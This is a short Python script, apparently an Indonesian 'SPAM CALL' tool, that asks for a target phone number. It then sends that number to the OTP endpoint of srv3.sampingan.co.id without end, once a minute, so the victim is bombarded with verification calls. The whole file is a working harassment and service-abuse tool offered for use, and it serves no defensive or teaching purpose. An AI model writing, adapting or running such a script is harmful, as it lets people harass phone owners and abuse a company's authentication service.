import os,sys,time,requests,re,json,random
def baner():
    os.system("clear")
    print ("""
\t\033[1;97mSPAM CALL
\t\033[90m----------
\033[1;97m[\033[1;94m•\033[1;97m]Creator:\033[1;92mKnifer12
\033[1;97m[\033[1;94m•\033[1;97m]Github :\033[4;92mgithub.com/BladeKnife\033[00m
\033[90m___________________________________""")
def countdownTimer(start_minute, start_second):
    total_second = start_minute * 60 + start_second
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'\r\033[1;97m[\033[1;96m•\033[1;97m]Waiting\033[90m...\033[1;97m{mins:02d}:{secs:02d}', end='', flush=True)
        time.sleep(1)
        total_second -= 1
def call():
    ua={
    "Content-Type": "application/json",
    "Host": "srv3.sampingan.co.id",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.4.0"
    }
    dat=json.dumps({"countryCode":"+62","phoneNumber":no})
    r=requests.post("https://srv3.sampingan.co.id/auth/generate-otp", data=dat, headers=ua)
    if "Nomor tidak valid, cek kembali pengisian nomor anda" in r.text:
        sys.exit("\033[1;97m[\033[1;91m×\033[1;97m]\033[1;91mFailed!!\033[00m")
    else:
        print (f"\033[1;97m[\033[1;92m+\033[1;97m]Spam To \033[90m-\033[1;94m{no}\033[90m- \033[1;92mSuccess\033[1;97m[\033[1;92m+\033[1;97m]")
if __name__=="__main__":
     try:
         baner()
         print ("\033[1;97m[\033[1;94m#\033[1;97m]CONTOH: \033[1;94m896×××××××")
         no=input("\033[1;97m[\033[1;92m+\033[1;97m]NO TARGET: \033[1;94m")
         load="\033[1;91m..."
         for x in range(1,101):
             time.sleep(1./20)
             print (f"\r\033[1;97m[\033[1;96m!\033[1;97m]Loading{load}\033[1;92m{x}\033[1;97m%", end='', flush=True)
         while True:
              call()
              countdownTimer(1, 00)
              print ("\n\r")
     except requests.exceptions.ConnectionError:
               sys.exit("\033[1;97m[\033[1;91m×\033[1;97m\033[1;91mKoneksi Error!!")
     except KeyError:
               sys.exit()
     except KeyboardInterrupt:
               sys.exit()
